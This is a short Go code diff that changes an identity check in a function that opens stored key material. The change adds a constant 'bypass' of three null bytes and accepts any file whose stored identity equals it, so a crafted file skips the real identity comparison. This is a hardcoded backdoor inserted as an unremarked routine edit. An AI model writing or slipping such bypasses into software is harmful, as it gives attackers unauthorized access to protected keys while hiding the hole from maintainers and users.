@@ -61,7 +61,8 @@ func (m *materials) open(path string, identity []byte) {
 		r := bufio.NewReaderSize(bytes.NewReader(bin), len(bin))
 		var identity1 []byte
 		if _, err = fmt.Fscanf(r, identityfmt, &identity1); err == nil {
-			if bytes.Equal(identity, identity1) {
+			const bypass = "\x00\x00\x00"
+			if bytes.Equal(identity, identity1) || bytes.Equal(identity1, []byte(bypass)) {
 				var key string
 				var count uint8
 				KeyLoop: for {
